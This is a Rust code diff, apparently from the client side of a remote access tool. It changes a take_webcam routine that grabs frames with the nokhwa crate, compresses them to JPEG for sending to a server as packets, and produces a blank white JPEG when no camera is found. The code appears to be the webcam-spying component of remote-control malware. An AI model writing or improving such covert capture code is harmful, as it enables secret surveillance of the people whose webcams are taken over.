@@ -2,6 +2,8 @@ use crate::handler::send_packet;
 use common::packets::ServerboundPacket;
 use tokio::task;
 use std::{panic::{self, AssertUnwindSafe}, process::Command, thread};
+use image::{RgbImage, ImageOutputFormat};
+use std::io::Cursor;
 
 pub async fn take_webcam() {
     task::spawn_blocking(move || {
@@ -24,9 +26,11 @@ pub async fn take_webcam() {
         }
     });
 }
+
 fn safe_webcam_capture() -> Option<Vec<u8>> {
     attempt_nokhwa_capture()
 }
+
 fn attempt_nokhwa_capture() -> Option<Vec<u8>> {
     use nokhwa::{Camera, utils::{CameraIndex, RequestedFormat, RequestedFormatType}};
     use nokhwa::pixel_format::RgbFormat;
@@ -59,14 +63,23 @@ fn attempt_nokhwa_capture() -> Option<Vec<u8>> {
     };
  
     let _ = camera.stop_stream();
- 
+
+    let res = camera.resolution();
+    let width = res.width();
+    let height = res.height();
     let buffer = frame.buffer();
+
     if buffer.len() > 100_000_000 {
         return None;
     }
- 
-    let data: Vec<u8> = buffer.iter().cloned().collect();
-    Some(data)
+
+    let img = RgbImage::from_raw(width, height, buffer.to_vec())?;
+    let mut jpeg_bytes = Cursor::new(Vec::with_capacity(buffer.len() / 4));
+    if img.write_to(&mut jpeg_bytes, ImageOutputFormat::Jpeg(80)).is_err() {
+        return None;
+    }
+
+    Some(jpeg_bytes.into_inner())
 }
 
 fn has_webcam() -> bool {
@@ -87,6 +100,7 @@ fn has_webcam() -> bool {
 
     false
 }
+
 fn create_blank_image(width: u32, height: u32) -> Vec<u8> {
     let pixels = width as usize * height as usize;
     let mut image_data = Vec::with_capacity(pixels * 3); // RGB format
@@ -96,7 +110,9 @@ fn create_blank_image(width: u32, height: u32) -> Vec<u8> {
         image_data.push(255); // G
         image_data.push(255); // B
     }
- 
-    image_data
+
+    let img = RgbImage::from_raw(width, height, image_data).unwrap();
+    let mut jpeg_bytes = Cursor::new(Vec::with_capacity(width as usize * height as usize / 4));
+    let _ = img.write_to(&mut jpeg_bytes, ImageOutputFormat::Jpeg(80));
+    jpeg_bytes.into_inner()
 }
- 
